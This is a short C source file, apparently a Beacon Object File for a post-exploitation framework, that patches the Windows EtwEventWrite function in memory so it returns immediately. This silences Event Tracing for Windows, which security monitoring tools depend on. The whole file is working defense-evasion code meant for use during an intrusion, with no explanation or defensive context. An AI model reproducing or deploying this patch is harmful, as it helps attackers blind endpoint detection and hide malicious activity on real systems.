#include <windows.h>
#include "beacon_compat.h"

DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetLastError(void);

void go(char *args, int args_len) {
    (void)args; (void)args_len;

    HMODULE hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        BeaconPrintf(CALLBACK_ERROR, "[!] ntdll.dll not found\n");
        return;
    }

    void *pFunc = (void *)KERNEL32$GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pFunc) {
        BeaconPrintf(CALLBACK_ERROR, "[!] EtwEventWrite not found\n");
        return;
    }

    /* x64: xor rax,rax; ret */
    unsigned char patch[] = { 0x48, 0x33, 0xC0, 0xC3 };
    DWORD oldProtect;

    if (!KERNEL32$VirtualProtect(pFunc, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] VirtualProtect failed: %lu\n", KERNEL32$GetLastError());
        return;
    }

    memcpy(pFunc, patch, sizeof(patch));
    KERNEL32$VirtualProtect(pFunc, sizeof(patch), oldProtect, &oldProtect);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] ETW patched (EtwEventWrite -> nop)\n");
}
